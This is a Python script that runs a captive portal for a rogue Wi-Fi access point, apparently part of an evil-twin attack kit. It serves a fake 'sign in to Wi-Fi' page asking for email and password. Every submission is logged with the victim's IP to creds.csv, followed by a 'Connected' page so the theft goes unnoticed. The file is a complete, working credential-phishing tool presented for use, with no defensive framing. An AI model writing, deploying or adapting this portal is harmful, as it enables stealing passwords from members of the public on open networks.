#!/usr/bin/env python3
"""Captive portal for the rogue AP (runs as root, binds :80).

Every DNS name resolves to us (dnsmasq address=/#/...), so any request on any
host/path is this page. Logging in stores whatever the victim submitted to
creds.csv, then shows the "connected" page so the captive-portal check passes
without bouncing them.
"""
import csv
import os
import signal
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PORTAL_DIR = os.environ.get("ROGUE_DIR", "/tmp/rogue")
CREDS_FILE = os.path.join(PORTAL_DIR, "creds.csv")
SSID = os.environ.get("ROGUE_SSID", "Free-WiFi")

_STYLE = """
body{margin:0;background:#0a0f0c;color:#e8ffe8;font-family:system-ui;display:flex;align-items:center;
justify-content:center;min-height:100vh}
.card{background:#071410;border:1px solid #1e4d33;border-radius:16px;padding:28px 24px;width:320px;
box-shadow:0 0 40px rgba(57,255,20,.12)}
h1{font-size:20px;margin:0 0 4px;color:#39ff14;letter-spacing:1px}
p{color:#9febb9;font-size:13px;margin:4px 0 18px}
label{display:block;font-size:12px;color:#34d399;margin:10px 0 4px;text-transform:uppercase;letter-spacing:1px}
input{width:100%;box-sizing:border-box;background:#04100c;border:1px solid #1a4532;color:#eafff0;
border-radius:8px;padding:12px;font-size:15px}
button{width:100%;margin-top:16px;background:#065f46;color:#b7ffe0;border:none;border-radius:8px;
padding:13px;font-size:15px;font-weight:600}
button:active{transform:scale(.97)}
.ok{color:#39ff14;font-size:15px;margin-top:8px}
"""


def _page(body):
    return ("<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
            "<title>%s — Sign in</title><style>%s</style></head>"
            "<body><div class=\"card\">%s</div></body></html>"
            % (_esc(SSID), _STYLE, body))


def _esc(v):
    import html
    return html.escape(str(v), quote=True)


def page_body():
    return ("<h1>%s</h1><p>Wi-Fi is ready. To get online, please sign in.</p>"
            "<form method=\"post\" action=\"/login\">"
            "<label>Email or ID</label><input name=\"user\" autocomplete=\"off\" "
            "autocapitalize=\"off\" required>"
            "<label>Password</label><input type=\"password\" name=\"pass\" required>"
            "<button type=\"submit\">Connect</button></form>"
            "<p style=\"margin-top:14px;color:#ffd54f\">Any connection check will "
            "be answered automatically.</p>" % _esc(SSID))


def ok_body():
    return "<h1>Connected</h1><p>Welcome to %s. You can close this tab.</p>" % _esc(SSID)


class PortalHandler(BaseHTTPRequestHandler):
    def _reply(self, code, body, ctype="text/html; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._reply(200, _page(page_body()).encode())

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            length = 0
        if length > 4096:
            self._reply(400, b"bad")
            return
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        qs = parse_qs(raw)
        user = (qs.get("user") or [""])[0].strip()
        pw = (qs.get("pass") or [""])[0].strip()
        if user or pw:
            try:
                os.makedirs(PORTAL_DIR, exist_ok=True)
                with open(CREDS_FILE, "a", newline="") as f:
                    csv.writer(f).writerow([time.strftime("%Y-%m-%d %H:%M:%S"),
                                            self.client_address[0] if self.client_address else "",
                                            SSID, user, pw])
            except OSError:
                pass
        self._reply(200, _page(ok_body()).encode())

    def log_message(self, *a):
        pass


def main():
    sig = [False]

    def _term(*_):
        sig[0] = True
    signal.signal(signal.SIGTERM, _term)
    signal.signal(signal.SIGINT, _term)

    try:
        os.makedirs(PORTAL_DIR, exist_ok=True)
    except OSError:
        pass
    if not os.path.isfile(CREDS_FILE):
        try:
            with open(CREDS_FILE, "w", newline="") as f:
                csv.writer(f).writerow(["time", "client_ip", "ssid", "user", "pass"])
        except OSError:
            pass
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", 80), PortalHandler)
    except OSError as exc:
        sys.stderr.write("portal cannot bind :80: %s\n" % exc)
        return 1
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    sys.stderr.write("captive portal up on :80 (ssid=%s)\n" % SSID)
    while not sig[0]:
        time.sleep(0.5)
    srv.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(main())